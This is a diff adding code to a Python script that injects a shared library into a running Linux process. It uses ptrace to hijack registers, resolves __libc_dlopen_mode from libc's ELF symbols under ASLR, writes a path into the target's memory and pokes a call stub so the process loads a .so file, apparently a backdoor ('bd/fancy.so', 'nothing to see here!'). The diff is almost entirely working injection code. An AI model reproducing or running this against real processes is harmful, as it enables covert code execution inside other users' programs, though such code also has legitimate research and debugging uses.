@@ -2,6 +2,7 @@
 import ctypes  # To interface with native APIs to use ptrace
 import sys
 import os
+from elftools.elf.elffile import ELFFile
 
 PTRACE_PEEKTEXT   = 1
 PTRACE_PEEKDATA   = 2
@@ -111,5 +112,121 @@ libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(backup_registers.rip), backup_
 # Put the backup registers back in place
 libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(backup_registers))
 # Continue executing, process, nothing to see here!
+libc.ptrace(PTRACE_CONT, pid, None, None)
+
+# Parse process map files
+def load_maps(pid):
+    handle = open('/proc/{}/maps'.format(pid), 'r')
+    output = []
+    for line in handle:
+        line = line.strip()
+        parts = line.split()
+        (addr_start, addr_end) = map(lambda x: int(x, 16), parts[0].split('-'))
+        permissions = parts[1]
+        offset = int(parts[2], 16)
+        device_id = parts[3]
+        inode = parts[4]
+        map_name = parts[5] if len(parts) > 5 else ''
+
+        mapping = {
+            'addr_start':  addr_start,
+            'addr_end':    addr_end,
+            'size':        addr_end - addr_start,
+            'permissions': permissions,
+            'offset':      offset,
+            'device_id':   device_id,
+            'inode':       inode,
+            'map_name':    map_name
+        }
+        output.append(mapping)
+
+    handle.close()
+    return output
+
+maps = load_maps(pid)
+
+# Figure out where lib c is being used in the process (look at code pages)
+process_libc = filter(
+    lambda x: '/libc-' in x['map_name'] and 'r-xp' == x['permissions'],
+    maps
+)
+
+if not process_libc:
+    print("Couldn't locate libc shared object in this process.")
+    sys.exit(1)
+
+# Figure out the base address for ASLR and location of file on disk
+libc_base     = process_libc[0]['addr_start']
+libc_location = process_libc[0]['map_name']
+# Open up the ELF file
+libc_elf = ELFFile(open(libc_location, 'r'))
+
+# Search for the __libc_dlopen_mode symbol
+__libc_dlopen_mode = filter(
+    lambda x: x.name == "__libc_dlopen_mode",
+    libc_elf.get_section_by_name('.dynsym').iter_symbols()
+)
+
+if not __libc_dlopen_mode:
+    print("Couldn't find __libc_dlopen_mode in libc")
+    sys.exit(1)
+
+# Print it all out
+__libc_dlopen_mode = __libc_dlopen_mode[0].entry['st_value']
+print("libc base @ ", hex(libc_base))
+print("dlopen_mode offset @ ", hex(__libc_dlopen_mode))
+__libc_dlopen_mode = __libc_dlopen_mode + libc_base
+print("function pointer @ ", __libc_dlopen_mode)
+
+class iovec(ctypes.Structure):
+    _fields_ = [
+        ("iov_base", ctypes.c_void_p),
+        ("iov_len", ctypes.c_ulong)
+    ]
+
+# Wrapper for process_vm_writev, I think
+def write_process_memory(pid, address, size, data):
+    bytes_buffer = ctypes.create_string_buffer('\x00'*size)
+    bytes_buffer.raw = data
+    local_iovec  = iovec(ctypes.cast(ctypes.byref(bytes_buffer), ctypes.c_void_p), size)
+    remote_iovec = iovec(ctypes.c_void_p(address), size)
+    bytes_transferred = libc.process_vm_writev(
+        pid, ctypes.byref(local_iovec), 1, ctypes.byref(remote_iovec), 1, 0
+    )
+
+    return bytes_transferred
+
+# Get the path to the Shared Object file (use cython to write in C)
+path = "/home/ancat/bd/fancy.so"
+write_process_memory(pid, rwx_page + 100, len(path)+1, path)
+
+# 3
+backup_registers = user_regs_struct()
+registers        = user_regs_struct()
+
+libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(backup_registers))
+libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
+backup_code = libc.ptrace(PTRACE_PEEKDATA, pid, ctypes.c_void_p(registers.rip), None)
+
+# 4
+registers.rdi = rwx_page + 100 # path to .so file
+registers.rsi = 1              # RTLD_LAZY
+registers.rax = __libc_dlopen_mode
+
+# Apply changes to registers and insert code
+libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
+libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(registers.rip), 0xccd0ff)
+libc.ptrace(PTRACE_CONT, pid, None, None)
+
+stat = os.waitpid(pid, 0)
+if os.WSTOPSIG(stat[1]) == 5:
+    print("SIGTRAP (injecting & executing stub)")
+else:
+    print("stopped for some other signal??", os.WSTOPSIG(stat[1]))
+    sys.exit(1)
+
+# 6
+libc.ptrace(PTRACE_POKEDATA, pid, ctypes.c_void_p(backup_registers.rip), backup_code)
+libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(backup_registers))
 libc.ptrace(PTRACE_CONT, pid, None, None)
 
